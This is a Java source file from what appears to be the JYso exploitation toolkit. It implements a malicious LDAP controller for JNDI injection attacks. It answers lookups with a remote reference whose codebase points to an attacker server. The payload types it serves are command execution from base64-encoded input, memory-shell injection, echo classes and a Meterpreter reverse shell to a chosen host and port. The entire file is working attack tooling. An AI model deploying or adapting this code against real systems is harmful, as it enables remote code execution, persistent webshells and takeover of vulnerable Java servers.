package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.InjShell;
import com.qi4l.JYso.gadgets.utils.Util;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import com.qi4l.JYso.template.CommandTemplate;
import com.qi4l.JYso.template.echoStatic.Meterpreter;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.fusesource.jansi.Ansi;

import java.net.URL;
import java.util.Base64;

import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/basic"})
public class BasicController implements LdapController {

    private static String     payloadType;
    //最后的反斜杠不能少
    private final  String     codebase = Config.codeBase;
    private        String[]   params;
    private        GadgetType gadgetType;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            Entry  e         = new Entry(base);
            String className = "";

            if (payloadType.contains("E-")) {
                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
                className = EchoClass.getName();
            }

            if (payloadType.contains("M-")) {
                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                InjShell.init(params);
                className = Gadgets.createClassB(ClassName1);
            }

            if (payloadType.contains("command")) {
                CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
            }

            if (payloadType.contains("msf")) {
                className = Meterpreter.class.getName();
            }

            String className1 = className.replaceAll("\\.", "/");

            URL    turl       = new URL(new URL(this.codebase), className1 + ".class");
            System.out.println(Ansi.ansi().fgBrightBlue().a("  redirecting to " + turl).reset());
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaCodeBase", this.codebase);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", className);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }

    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        System.out.println("- JNDI Remote Refenrence Links ");
        try {
            base = base.replace('\\', '/');
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                payloadType = base.substring(fistIndex + 1, secondIndex);
                System.out.println(Ansi.ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex != -1) {
                if (thirdIndex < 0) thirdIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(secondIndex + 1, thirdIndex));
                }
            }

            if (gadgetType == GadgetType.base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                params = new String[]{cmd};
            }

            if (gadgetType == GadgetType.shell) {
                String   cmd1         = Util.getCmdFromBase(base);
                byte[]   decodedBytes = Base64.getDecoder().decode(cmd1);
                String   cmd          = new String(decodedBytes);
                String[] cmdArray     = cmd.split(" ");
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                params = cmdArray;
            }

            if (gadgetType == GadgetType.msf) {
                String[] results1     = Util.getIPAndPortFromBase(base);
                Config.rhost = results1[0];
                Config.rport = results1[1];
                System.out.println("[+] RemotHost: " + results1[0]);
                System.out.println("[+] RemotPort: " + results1[1]);
                params = results1;
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
